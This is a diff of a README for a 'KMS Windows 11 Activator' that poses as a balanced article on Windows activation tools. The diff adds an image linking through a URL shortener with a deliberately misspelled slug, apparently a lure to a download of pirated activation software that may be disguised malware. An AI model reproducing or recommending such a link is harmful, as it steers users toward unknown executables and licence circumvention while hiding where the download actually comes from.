@@ -1,6 +1,8 @@
 # KMS Windows 11 Activator
 If you’ve recently installed Windows 11 but can’t access personalization features or you're stuck with the persistent “Activate Windows” watermark, you might be considering a Windows 11 activator. It sounds like a quick fix—but is it really a smart move?
 
+[![6749478078](https://github.com/user-attachments/assets/92c091e6-7406-4a0a-a2cf-bc05353d3d0c)](https://y.gy/kmss-wimdowss-11-activator)
+
 In this article, we dive into the pros, cons of using Windows 11 activators in 2025. Whether you're a budget-conscious user, a student, or a curious techie, this guide gives you everything you need to know before clicking "Activate."
 
 ## What is a Windows 11 Activator and Why Should You Care?
